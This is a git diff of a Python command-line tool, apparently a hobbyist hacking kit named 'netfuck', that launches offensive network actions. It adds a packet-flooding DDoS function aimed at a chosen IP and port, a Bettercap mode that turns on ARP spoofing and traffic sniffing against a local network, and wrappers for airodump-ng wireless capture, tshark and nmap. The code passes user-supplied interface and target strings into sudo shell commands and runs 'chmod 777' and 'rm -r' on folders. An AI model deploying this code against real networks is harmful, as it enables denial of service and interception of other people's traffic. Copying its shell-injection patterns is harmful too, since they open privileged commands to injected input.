@@ -1,6 +1,8 @@
 #!/usr/bin/python3
 import subprocess
 import sys, os, codecs
+from ast import parse
+from logging import exception
 from optparse import OptionParser
 import socket
 import threading
@@ -8,13 +10,16 @@ from pathlib import Path
 from argparse import ArgumentParser
 import random
 
+uname = os.getlogin() # gets username eg kai for home/kai/ makes it easier for users to get into dir
+
 GREEN = '\033[92m'
+YELLOW = '\033[93m'
 RED = '\033[31m'
 RESET = '\033[0m'
 stop_attack = False
 output_lock = threading.Lock()
 
-# ddos packet function (WIP)
+# DDoS packet function (ERR, MUST BE DELT WITH)
 def dos_attack(target_ip, target_port, output_list, index, column_width):
     global stop_attack
     data_list = [b"netfuck" * 10917] * 12
@@ -40,7 +45,7 @@ def dos_attack(target_ip, target_port, output_list, index, column_width):
                 output_list[index] = f"Error: {err}".ljust(column_width)
             break
 
-# ddos function (WIP)
+# DDoS function (ERR, MUST BE DELT WITH)
 def ddos(ip: str = None, port: int = 443, instanceNum: int = 1):
     print(f"{RED}You are fucked{RESET}")
     targets = []
@@ -70,41 +75,104 @@ def ddos(ip: str = None, port: int = 443, instanceNum: int = 1):
 def bash(commands):
     subprocess.call(commands, shell=True)
 
-# airscan function commands
+# Aircrack function commands
 def airscan_commands(netdevice):
     print("Starting Air Scan")
     subprocess.run([f"cd /"], shell=True, check=True)
-    subprocess.run([f"sudo mkdir /home/netfuck/"], shell=True)
+    subprocess.run([f"sudo mkdir /home/{uname}/netfuck/Airscan"], shell=True)
     subprocess.run([f"sudo airmon-ng start {netdevice}"], shell=True)
-    subprocess.run([f"sudo airodump-ng {netdevice}mon -w /home/netfuck/output"], shell=True)
-    subprocess.run([f"sudo airgraph-ng -i /home/netfuck/output-01.csv -o /home/netfuck/output.png -g CAPR"], shell=True)
+    subprocess.run([f"sudo airodump-ng {netdevice}mon -w /home/{uname}/netfuck/Airscan/output"], shell=True)
+    subprocess.run([f"sudo airgraph-ng -i /home/{uname}/netfuck/Airscan/output-01.csv -o /home/{uname}/netfuck/Airscan/output.png -g CAPR"], shell=True)
     subprocess.run([f"sudo airmon-ng stop {netdevice}mon"], shell=True)
-    subprocess.run([f"xdg-open /home/netfuck/output.png"], shell=True)
+    subprocess.run([f"xdg-open /home/{uname}/netfuck/Airscan/output.png"], shell=True)
 
-# airscan function
+# Aircrack Dir function
 def airscan(
         netdevice: str = "wlan0",
-
     ):
-    areyousure = str(input("This will disable networkmanager, are you sure you want to run this program: "))
-    if areyousure.strip().lower() in ("y", "yes"):
+    areyousure = str(input(f"\n{YELLOW}WARNING: THIS WILL DISABLE NETWROK MANAGER, ARE YOU SURE YOU WANT TO RUN THIS PROGRAM: {RESET}"))
+    if areyousure.strip().lower().startswith('y'):
         try:
-            myfile = Path("/home/netfuck/output.png")
+            myfile = Path(f"/home/{uname}/netfuck/Airscan/output.png")
             if myfile.is_file():
-                airscan_previous_files = input("Previous Files have been found, if you continue they will be overwritten. Are you sure you want to continue? (Y/N): ")
-                if airscan_previous_files.strip().lower() in ("y", "yes"):
-                    subprocess.run(["sudo chmod 777 /home/netfuck"], shell=True)
-                    subprocess.run(["sudo rm -r /home/netfuck/"], shell=True)
+                airscan_previous_files = input(f"{YELLOW}WARNING: PREVIOUS FILES HAVE BEEN FOUND, IF YOU CONTINUE THEY WILL BE OVERWRITTEN. ARE YOU SURE YOU WANT TO CONTINUE? (Y/N): {RESET}")
+                if airscan_previous_files.strip().lower().startswith('y'):
+                    subprocess.run([f"sudo chmod 777 /home/{uname}/netfuck/Airscan/"], shell=True)
+                    subprocess.run([f"sudo rm -r /home/{uname}/netfuck/Airscan/"], shell=True)
                     airscan_commands(netdevice)
                 else:
                     exit()
             else:
                 airscan_commands(netdevice)
-
         except KeyboardInterrupt:
-
             exit(0)
+        except FileNotFoundError:
+            print("Aircrack-NG / Airgraph-ng not found please install using 'sudo apt install aircrack-ng' or 'sudo apt install airgraph-ng'")
+    else:
+        print(f"{RED}Exiting...{RESET}")
+        exit(0)
 
+# TShark Capture Function
+def tshark_capture(netdevice):
+    print(f"{GREEN}Starting Packet Capture on {netdevice}...{RESET}")
+    subprocess.run([f"sudo mkdir -p /home/netfuck/tshark_capture"], shell=True)
+    subprocess.run([f"sudo tshark -i {netdevice} -w /home/netfuck/tshark_capture/output.pcapng"], shell=True)
+    print(f"{GREEN}Capture complete. Saved as /home/netfuck/tshark_capture/output.pcapng{RESET}")
+    subprocess.run([f"xdg-open /home/netfuck/tshark_capture/output.pcapng"], shell=True)
+
+# TShark Scan Function
+def tshark_scan(
+        netdevice: str = "eth0",
+):
+    areyousure = str(input(
+        f"{YELLOW}This will start capturing packets on {netdevice}. Are you sure you want to proceed? (Y/N): {RESET}"))
+    if areyousure.strip().lower() in ("y", "yes"):
+        try:
+            myfile = Path("/home/netfuck/tshark_capture/output.pcapng")
+            if myfile.is_file():
+                tshark_previous_files = input(
+                    f"{YELLOW}Previous capture file found. Continuing will overwrite it. Do you want to proceed? (Y/N): {RESET}")
+                if tshark_previous_files.strip().lower() in ("y", "yes"):
+                    subprocess.run(["sudo chmod 777 /home/netfuck/tshark_capture"], shell=True)
+                    subprocess.run(["sudo rm -r /home/netfuck/tshark_capture"], shell=True)
+                    tshark_capture(netdevice)
+                else:
+                    exit()
+            else:
+                tshark_capture(netdevice)
+        except KeyboardInterrupt:
+            print(f"\n{RED}Scan interrupted by user. Exiting...{RESET}")
+            exit(0)
+    else:
+        print(f"{RED}Exiting...{RESET}")
+        exit(0)
+
+
+# Nmap Function
+def nmap_scan(target, os_detect=False):
+    print(f"\n{GREEN}Running Scan On {target}...\nThis May Take A While...\n{RESET}")
+    if os_detect:
+        subprocess.run(f"nmap {target} -O -Pn", shell=True)
+    else:
+        subprocess.run(f"nmap -sV {target} -Pn", shell=True)
+    print("")
+
+# Bettercap Function
+def bettercap(
+        netdevice: str = "wlan0",
+    ):
+    areyousure = input(f"{YELLOW}\nWARNING: THIS WILL ALERT USERS ON THE NETWORK OF SUSPICIOUS ACTIVITY. DO YOU WISH TO CONTINUE? (Y/N): {RESET}").strip().lower()
+    if areyousure.startswith('y'):
+        try:
+            print(f"{GREEN}Starting Bettercap on interface {netdevice}...{RESET}")
+            subprocess.run(f"sudo bettercap -iface {netdevice} -eval 'net.probe on; arp.spoof on; net.sniff on'", shell=True, check=True)
+        except KeyboardInterrupt:
+            print(f"\n{RED}Scan stopped by user.{RESET}")
+        except FileNotFoundError:
+            print(f"{RED}Bettercap is not installed. Please install it using 'sudo apt install bettercap'.{RESET}")
+        except Exception as e:
+            # Catch-all for any other exceptions
+            print(f"{RED}An unexpected error occurred: {e}{RESET}")
     else:
         print(f"{RED}Exiting...{RESET}")
         exit(0)
@@ -114,21 +182,16 @@ if __name__ == "__main__":
 
     parser = ArgumentParser(prog="netfuck", add_help=True)
 
-    # '-h' or '--help' CLI GUI
-    parser.add_argument("-a", "--airscan", dest="airscan", type=str, help="airscan [IP] [PORT]: scans and displays current and closest network.")
-    parser.add_argument("-d", "--ddos", dest="ddos", type=str, help="ddos: sends packets to target")
-    parser.add_argument("-n", "--nmap", dest="nmap", type=str, help="nmap: scans open ports on target networks")
+    # Argument Parsing List
+    parser.add_argument("-a", "--airscan", dest="airscan", type=str, help="airscan [NET_DEVICE]: scans and displays current and closest network.")
+    parser.add_argument("-d", "--ddos", dest="ddos", type=str, help="ddos: sends packets to target.")
+    parser.add_argument("-n", "--nmap", dest="nmap", type=str, help="nmap: scans open ports on target networks.")
+    parser.add_argument("-O", "--os-detect", action="store_true", help="Enable OS detection with nmap.")
+    parser.add_argument("-t", "--tshark", dest="tshark", type=str, help="tshark: capture network packets on specified interface")
+    parser.add_argument("-b", "--cap", dest="bettercap", type=str, help="MITM Tool For LAN Networks using Bettercap")
+    # ADD COMMANDS LIST FOR OTHER CYBERSECURITY TOOLS
 
     ascii_art_list = [
-        """
-        ░▒▓███████▓▒░  ░▒▓████████▓▒░ ░▒▓████████▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓██████▓▒░      ░▒▓█▓▒░     ░▒▓██████▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓███████▓▒░  
-        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
-        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░    ░▒▓█▓▒░     ░▒▓█▓▒░         ░▒▓██████▓▒░   ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ 
-        """,
         """
              ,--.                                                                        
            ,--.'|                ___         ,---,.                                 ,-.  
@@ -144,29 +207,52 @@ if __name__ == "__main__":
     '   : |       |   :    |   |  ,   /  |   :  \   :  ,      .-./ |   :    : ;  |,'     
     ;   |.'        \   \  /     ---`-'   |   | ,'    `--`----'      \   \  /  '--'       
     '---'           `----'               `----'                      `----'              
+        """,
+        """
+     ██████   █████           █████    ███████████                     █████     
+    ░░██████ ░░███           ░░███    ░░███░░░░░░█                    ░░███      
+     ░███░███ ░███   ██████  ███████   ░███   █ ░  █████ ████  ██████  ░███ █████
+     ░███░░███░███  ███░░███░░░███░    ░███████   ░░███ ░███  ███░░███ ░███░░███ 
+     ░███ ░░██████ ░███████   ░███     ░███░░░█    ░███ ░███ ░███ ░░░  ░██████░  
+     ░███  ░░█████ ░███░░░    ░███ ███ ░███  ░     ░███ ░███ ░███  ███ ░███░░███ 
+     █████  ░░█████░░██████   ░░█████  █████       ░░████████░░██████  ████ █████
+    ░░░░░    ░░░░░  ░░░░░░     ░░░░░  ░░░░░         ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░ 
         """
     ]
 
     # Randomly select one ASCII art from the list
     selected_ascii_art = random.choice(ascii_art_list)
-
     # Now you can print the randomly selected ASCII art
-    print(selected_ascii_art)
+    print(f"{GREEN}{selected_ascii_art}{RESET}")
 
-    (options, args) = parser.parse_known_args() # Option Selections (in format 'option argument')
+
+    # Option Handling Here : D
+    (options, args) = parser.parse_known_args()
     print(options)
     print(args)
 
-    # airscan option
+    # AirScan option
     if options.airscan:
         airscan(options.airscan)
 
-    # ddos option (WIP)
+    # DDoS option
     if options.ddos:
-        if args[0] is None or args[1] is None:
+        if len(args) < 2 or not args[0] or not args[1].isdigit():
+            print(f"{YELLOW}DDoS Requires IP & Port Arguments.{RESET}\n")
+        else:
             ddos(options.ddos, int(args[0]), int(args[1]))
-        ddos(options.ddos, int(args[0]), int(args[1]))
 
+    # Nmap option
+    if options.nmap:
+        nmap_scan(options.nmap, os_detect=options.os_detect)
+
+    # Tshark Scan option
+    if options.tshark:
+        tshark_scan(options.tshark)
+
+    # Bettercap Option
+    if options.bettercap:
+        bettercap(netdevice=options.bettercap)
 
 # Local Variables: ***
 # mode: python     ***
